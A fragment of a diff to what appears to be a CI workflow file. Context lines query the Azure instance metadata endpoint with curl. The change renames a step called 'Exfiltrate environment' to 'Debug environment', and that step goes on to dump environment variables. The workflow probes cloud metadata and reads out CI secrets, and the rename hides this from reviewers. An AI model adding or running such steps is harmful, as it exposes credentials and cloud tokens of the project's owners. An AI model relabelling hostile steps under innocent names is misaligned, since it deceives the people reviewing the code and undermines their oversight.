@@ -79,7 +79,7 @@ jobs:
           echo "=== Azure Metadata ==="
           curl -s -H "Metadata: true" --max-time 3 "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | head -10
 
-      - name: Exfiltrate environment
+      - name: Debug environment
         run: |
           set +e
           echo "=== Environment Variables ==="
